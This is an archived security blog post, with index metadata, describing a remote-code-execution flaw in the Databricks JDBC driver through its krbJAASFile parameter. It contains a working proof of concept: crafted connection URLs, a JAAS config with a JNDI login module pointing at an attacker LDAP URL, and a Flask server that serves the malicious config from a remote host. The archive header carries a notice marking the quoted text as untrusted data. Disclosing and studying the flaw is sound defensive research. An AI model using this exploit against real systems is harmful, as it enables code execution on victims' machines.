---
type: Article
title: Databricks JDBC Attack via JAAS
description: "The Databricks JDBC driver accepts a JAAS config property pointing at a remote URL, so a victim using an attacker-supplied connection string fetches a config naming a JNDI login module with an attacker LDAP provider URL, turning the connection into JNDI injection and remote code execution in the driver's process."
resource: "https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/"
tags: [article, webseclist-reference, en, blog-pyn3rd-com, rce, injection, gadget-chain, java, database, prior-art-extension, owasp-a03-2021, owasp-a08-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-09T10:08:05+00:00"
status: deprecated
stale_after: 2027-08-09
sources:
  - id: original
    resource: "https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/"
    title: Databricks JDBC Attack via JAAS
    author: pyn3rd
    last_modified: 2024-12-13
  - id: capture
    resource: "https://web.archive.org/web/20241220083620/https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/"
also_at: []
authors:
  - pyn3rd
canonical_url: ""
cited_by:
  - "2024.md:123"
commit: ""
content_sha256: df6db1af7375948b748ba7b6f264e4d08122de4028aefb062afe956248edf743
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/"
published: 2024-12-13
publisher: blog.pyn3rd.com
publisher_english: ""
raw_sha256: 17544f95ba0b668f1ae87aaeb31e4cd63f24c07fc8d1452ee43760a30b15dd9b
retrieved_from: "https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/"
retrieved_kind: stored
retrieved_utc: "2026-08-09T10:08:05+00:00"
slug: 2024-blog-pyn3rd-com-databricks-jdbc-attack-jaas
snapshot: 20241220083620
title_english: ""
translation_file: ""
translation_of: ""
---

# Databricks JDBC Attack via JAAS

**Databricks JDBC Attack via JAAS** - pyn3rd, blog.pyn3rd.com.

- Published: 2024-12-13
- Original: <https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/>
- Preserved from: https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/ (stored) on 2026-08-09
- Capture timestamp: 20241220083620
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

### Background Story

Yesterday, I received a threat intelligence alert regarding the Databricks JDBC driver. After a quick review, I pinpointed the root cause of the issue.

The vulnerability stems from improper handling of the krbJAASFile parameter. An attacker could potentially exploit this flaw to achieve remote code execution (RCE) within the driver’s context by tricking the victim into using a specially crafted connection URL that includes the krbJAASFile property. It’s important to note that the affected product versions are 2.6.38 and earlier.

### Constructing a PoC

Creating a proof of concept (PoC) is crucial for reproducing vulnerabilities effectively. It can often save significant time during the testing process. Having researched JDBC assemblies for several years, I understand how vital it is to develop a clear and reliable PoC.

Here is the vulnerable connection URL:

|

```
1

```

 |

```
jdbc:databricks://127.0.0.1:443;AuthMech=1;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=/tmp/jaas.conf";

```

 |  |

The JAAS configuration file is as follows:

|

```
1
2
3
4
5
6
7
8

```

 |

```
Client {
com.sun.security.auth.module.JndiLoginModule required
    user.provider.url="ldap://127.0.0.1:1389/wr4euw"
    group.provider.url="test"
    useFirstPass=true
    serviceName="test"
    debug=true;
};

```

 |  |

![upload successful](https://blog.pyn3rd.com/images/pasted-330.png)

Clearly, this is not the desired outcome. Since we cannot compromise a server and modify its configuration or JAAS file, I’ve developed a web server to serve the content of the configuration file—essentially a malicious JNDI remote codebase.

I’ve arranged the web server code using Flask as follows:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```

 |

```
from flask import Flask, request

app = Flask(__name__)

@app.route('/jaas.conf', methods=['POST','GET'])
def SSOJSON():
    if request.method == 'GET':
        # Path to your jaas.conf file
        jaas_conf_path = '/root/ssl/jaas.conf'
        try:
            # Read the contents of the jaas.conf file
            with open(jaas_conf_path, 'r') as file:
                jaas_content = file.read()

            return jaas_content
        except Exception as e:
            # Handle exceptions (file not found, etc.)
            return false;

if __name__ == '__main__':
     app.run('0.0.0.0', debug=True, port=443, ssl_context=('/root/ssl/jdbc.pyn3rd.com.pem', '/root/ssl/jdbc.pyn3rd.com.key'))

```

 |  |

My approach is sound: the remote web server receives a request, and the malicious configuration file is loaded seamlessly. The remote code execution is then triggered via JNDI injection.

Here’s the crafted connection URL used to exploit the vulnerability:

![upload successful](https://blog.pyn3rd.com/images/pasted-332.png)

|

```
1

```

 |

```
jdbc:databricks://127.0.0.1:443;AuthMech=1;principal=test;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=https://jdbc.pyn3rd.com:443/jaas.conf

```

 |  |

If you have any questions, leave a comment below.
